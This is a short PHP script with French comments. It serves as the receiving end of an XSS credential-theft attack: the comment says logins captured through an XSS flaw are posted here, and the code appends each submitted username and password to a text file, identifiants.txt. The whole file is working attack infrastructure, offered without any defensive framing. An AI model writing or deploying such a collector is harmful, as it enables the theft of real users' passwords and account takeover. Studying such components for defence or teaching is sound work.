<?php

// Les identifiants récupérés via la faille xss sont envoyées sur cette page
// pour êtres sauvegardés dans un fichier texte

if (isset($_POST['username']) && isset($_POST['password'])) {
	
	$file = 'identifiants.txt';
	
	$current = file_get_contents($file);
	
	$current .= $_POST['username'] . ":" . $_POST['password'] . "\n";
	
	file_put_contents($file, $current);
	
} else {
	
}

?>